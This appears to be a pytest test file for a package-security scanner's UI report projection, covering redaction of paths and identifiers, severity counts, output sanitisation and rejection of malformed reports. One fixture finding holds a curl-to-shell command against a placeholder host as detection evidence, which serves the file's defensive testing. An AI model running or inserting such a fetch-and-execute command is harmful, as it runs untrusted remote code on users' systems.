import io
import json
from pathlib import Path

import pytest

from aurascan.core import ui_cli


def _finding(**overrides):
    data = {
        "finding_id": "fixture-finding-identifier",
        "rule_id": "NET-EXEC-001",
        "severity": "CRITICAL",
        "confidence": "CONFIRMED",
        "evidence_quality": "confirmed_static_pattern",
        "phase": "pkgbuild_static",
        "source": "deterministic_rule",
        "file_path": "/home/example/private/pkg/PKGBUILD",
        "line_number": 13,
        "evidence_snippet": "curl -fsSL https://example.invalid/payload | sh",
        "raw_output": "raw fixture output",
        "technical_details": {"private": "details"},
        "file_hash": "deadbeefdeadbeef",
        "explanation": "Remote execution (curl|wget piped to shell).",
        "recommendation": "Do not build this package.",
        "what_aurascan_checked": "Package control text.",
        "what_aurascan_did_not_check": "Whether the command ran.",
        "blocks_installation": True,
        "requires_manual_review": False,
    }
    data.update(overrides)
    return data


def _report(**overrides):
    data = {
        "schema_version": "1.0",
        "scanner_version": "2.6.0",
        "package_metadata": {"name": "example-pkg", "version": "1.0-1"},
        "risk_summary": {
            "severity": "CRITICAL",
            "action": "BLOCKED",
            "recommended_action": "block",
            "requires_manual_review": False,
            "blocks_installation": True,
            "reason": "deterministic critical rule",
        },
        "findings": [_finding()],
        "messages": ["Scanned"],
        "scan_policy": "full",
        "scan_context": "unknown",
        "scan_context_source": "default",
    }
    data.update(overrides)
    return data


def test_report_projection_drops_raw_bytes_paths_and_identifiers():
    projected = ui_cli.project_scan_report(_report())
    encoded = json.dumps(projected)

    assert "/home/" not in encoded
    assert "example.invalid" not in encoded
    assert "raw fixture output" not in encoded
    assert "deadbeef" not in encoded
    assert "fixture-finding-identifier" not in encoded
    assert "private" not in encoded
    assert projected["findings"][0]["file_name"] == "PKGBUILD"


def test_report_projection_keeps_structured_evidence():
    finding = ui_cli.project_scan_report(_report())["findings"][0]

    assert finding == {
        "rule_id": "NET-EXEC-001",
        "severity": "CRITICAL",
        "confidence": "CONFIRMED",
        "evidence_quality": "confirmed_static_pattern",
        "phase": "pkgbuild_static",
        "source": "deterministic_rule",
        "file_name": "PKGBUILD",
        "line_number": 13,
        "title": "",
        "summary": "Remote execution (curl|wget piped to shell).",
        "recommendation": "Do not build this package.",
        "checked": "Package control text.",
        "not_checked": "Whether the command ran.",
        "blocks_installation": True,
        "requires_manual_review": False,
    }


def test_report_projection_carries_identity_risk_and_counts():
    projected = ui_cli.project_scan_report(_report())

    assert projected["package"] == {
        "name": "example-pkg",
        "version": "1.0-1",
        "pkgbase": "",
        "maintainer": "",
    }
    assert projected["risk"]["severity"] == "CRITICAL"
    assert projected["risk"]["action"] == "BLOCKED"
    assert projected["counts"] == {
        "total": 1,
        "by_severity": {"LOW": 0, "MEDIUM": 0, "HIGH": 0, "CRITICAL": 1},
        "blocking": 1,
        "manual_review": 0,
        "truncated": False,
    }
    assert projected["context"] == {
        "scan_policy": "full",
        "scan_context": "unknown",
        "scan_context_source": "default",
    }


def test_report_truncates_displayed_findings_but_counts_everything():
    findings = [
        _finding(severity="LOW", blocks_installation=False)
        for _ in range(ui_cli.MAX_FINDINGS + 50)
    ]

    projected = ui_cli.project_scan_report(_report(findings=findings))

    assert projected["counts"]["total"] == ui_cli.MAX_FINDINGS + 50
    assert len(projected["findings"]) == ui_cli.MAX_FINDINGS
    assert projected["counts"]["truncated"] is True
    assert projected["counts"]["by_severity"]["LOW"] == ui_cli.MAX_FINDINGS + 50


def test_report_sanitizes_display_text():
    finding = ui_cli.project_scan_report(
        _report(
            findings=[
                _finding(
                    user_summary="",
                    explanation="\x1b[31m[AuraScan] fake\x1b[0m prompt",
                )
            ]
        )
    )["findings"][0]

    assert "\x1b" not in json.dumps(finding)
    assert "[untrusted text]" in finding["summary"]


def test_report_rejects_unknown_vocabulary():
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(_report(findings=[_finding(severity="SEVERE")]))
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(_report(findings=[_finding(confidence="CERTAIN")]))
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(
            _report(risk_summary={"severity": "LOW", "action": "PROCEED"})
        )


def test_report_rejects_foreign_or_incomplete_documents():
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report({"schema_version": "1.0"})
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(_report(package_metadata={}))
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(_report(findings="not-a-list"))
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.project_scan_report(_report(findings=[_finding(rule_id="bad rule id")]))


def test_load_report_file_rejects_bad_inputs(tmp_path, monkeypatch):
    missing = tmp_path / "missing.json"
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.load_report_file(missing)

    invalid = tmp_path / "invalid.json"
    invalid.write_text("{not json", encoding="utf-8")
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.load_report_file(invalid)

    array = tmp_path / "array.json"
    array.write_text("[]", encoding="utf-8")
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.load_report_file(array)

    monkeypatch.setattr(ui_cli, "MAX_REPORT_BYTES", 32)
    oversized = tmp_path / "oversized.json"
    oversized.write_text(json.dumps(_report()), encoding="utf-8")
    with pytest.raises(ui_cli.UISnapshotError):
        ui_cli.load_report_file(oversized)


def test_run_ui_report_mode_skips_live_evidence(tmp_path):
    path = tmp_path / "report.json"
    path.write_text(json.dumps(_report()), encoding="utf-8")

    def forbidden_provider():
        raise AssertionError("live evidence must not be collected in report mode")

    stdout = io.StringIO()
    stderr = io.StringIO()
    code = ui_cli.run_ui(
        ["--report", str(path), "--json"],
        stdout=stdout,
        stderr=stderr,
        doctor_checks_provider=forbidden_provider,
        intelligence_provider=forbidden_provider,
        incidents_provider=forbidden_provider,
        now=lambda: 1234,
    )

    payload = json.loads(stdout.getvalue())
    assert code == 0
    assert stderr.getvalue() == ""
    assert sorted(payload) == ["app", "contract", "generated_at", "report"]
    assert payload["generated_at"] == 1234
    assert payload["report"]["package"]["name"] == "example-pkg"
    assert payload["report"]["findings"][0]["rule_id"] == "NET-EXEC-001"


def test_run_ui_report_mode_fails_closed_without_details():
    def broken_loader(_path):
        raise ui_cli.UISnapshotError("report file is not a valid AuraScan JSON report")

    stdout = io.StringIO()
    stderr = io.StringIO()
    code = ui_cli.run_ui(
        ["--report", "/nonexistent/report.json", "--json"],
        stdout=stdout,
        stderr=stderr,
        report_loader=broken_loader,
        now=lambda: 1234,
    )

    assert code == 1
    assert stdout.getvalue() == ""
    assert "Desktop snapshot unavailable" in stderr.getvalue()


def test_run_ui_report_summary_is_evidence_only(tmp_path):
    path = tmp_path / "report.json"
    path.write_text(json.dumps(_report()), encoding="utf-8")
    stdout = io.StringIO()

    code = ui_cli.run_ui(
        ["--report", str(path)],
        stdout=stdout,
        stderr=io.StringIO(),
        now=lambda: 1234,
    )

    text = stdout.getvalue()
    lowered = text.lower()
    assert code == 0
    assert "AuraScan report (aurascan-ui/1)" in text
    assert "example-pkg 1.0-1" in text
    assert "Risk: CRITICAL (BLOCKED)" in text
    assert "NET-EXEC-001 [CRITICAL] PKGBUILD:13" in text
    assert "not a certification" in lowered
    for forbidden in ("is safe", "is clean", "is trusted", "approved"):
        assert forbidden not in lowered


def test_cli_help_lists_the_report_option():
    help_text = ui_cli.build_ui_parser().format_help()

    assert "--report" in help_text


def test_desktop_sample_report_matches_the_python_projection_shape():
    fixture = (
        Path(__file__).resolve().parents[1]
        / "desktop"
        / "src"
        / "fixtures"
        / "snapshot.sample.json"
    )
    sample_report = json.loads(fixture.read_text(encoding="utf-8"))["report"]
    projected = ui_cli.project_scan_report(_report())

    assert set(sample_report) == set(projected)
    assert set(sample_report["package"]) == set(projected["package"])
    assert set(sample_report["risk"]) == set(projected["risk"])
    assert set(sample_report["counts"]) == set(projected["counts"])
    assert set(sample_report["counts"]["by_severity"]) == set(
        projected["counts"]["by_severity"]
    )
    assert set(sample_report["findings"][0]) == set(projected["findings"][0])
